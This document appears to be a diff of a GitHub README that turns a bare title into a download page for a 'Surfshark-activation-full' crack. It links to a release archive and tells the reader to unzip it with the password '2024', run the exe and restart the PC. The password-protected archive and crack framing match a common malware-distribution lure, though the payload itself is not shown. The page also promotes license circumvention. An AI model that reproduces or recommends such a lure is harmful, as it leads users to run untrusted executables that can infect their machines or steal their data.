@@ -1,1 +1,19 @@
-# Surfshark-full-by-piuj
+# Download - [click](https://github.com/vmerhoushigirl1/vmerhoushigirl1/releases/tag/v1.5.2)
+
+## Surfshark-activation-full
+
+# easy installation:
+
+```sh-session
+Download the archive
+Unzip to any folder(pass:2024)
+Run the exe
+Click continue
+Select the program you want to activate
+Restart the pc and open the activated program
+Enjoy
+```
+
+
+
+by jel
